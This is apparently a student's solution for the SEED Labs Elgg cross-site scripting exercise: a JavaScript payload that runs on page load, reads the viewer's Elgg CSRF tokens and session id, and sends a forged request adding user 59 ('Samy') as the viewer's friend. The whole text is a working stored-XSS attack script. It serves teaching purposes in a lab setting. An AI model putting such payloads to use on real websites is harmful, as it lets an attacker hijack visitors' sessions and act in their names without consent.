<script type="text/javascript">
	window.onload = function () {

	    
	    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	    var token="&__elgg_token="+elgg.security.token.__elgg_token;
		var guid = elgg.session.user.guid;
	    //Construct the HTTP request to add Samy as a friend.

	    var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + ts + token + token; //FILL IN
        console.log( sendurl )


	//Create and send Ajax request to add friend
		if(guid != 59)
		{

			var Ajax = null;
			Ajax=new XMLHttpRequest();
			Ajax.open("GET",sendurl,true);
			Ajax.setRequestHeader("Host","www.seed-server.com");
			Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			Ajax.send();

		}

	}
</script>